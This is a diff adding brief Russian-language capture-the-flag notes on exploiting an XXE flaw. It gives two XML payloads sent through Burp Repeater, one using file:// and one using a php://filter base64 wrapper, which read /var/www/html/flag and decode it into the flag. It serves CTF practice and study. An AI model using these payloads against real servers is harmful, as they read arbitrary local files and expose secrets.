@@ -1,0 +1,27 @@
+1 Syntax chek
+Заходим в burp, отсылаем в repeater, пишем там в <> таких скобочках что нибудь, дальше вводим это
+<?xml version="1.0" encoding="ISO-8859-1"?>
+ <!DOCTYPE foo[
+ <!ELEMENT foo ANY>
+<!ENTITY xxe SYSTEM
+ "file:///var/www/html/flag">
+]>
+<foo>
+&xxe;
+</foo>
+
+
+а потом
+
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+ <!DOCTYPE foo[
+ <!ELEMENT foo ANY>
+<!ENTITY xxe SYSTEM
+ "php://filter/convert.base64-encode/resource=/var/www/html/flag">
+]>
+<foo>
+&xxe;
+</foo>
+
+Дальше отправляем в декодер и получаем флаг 
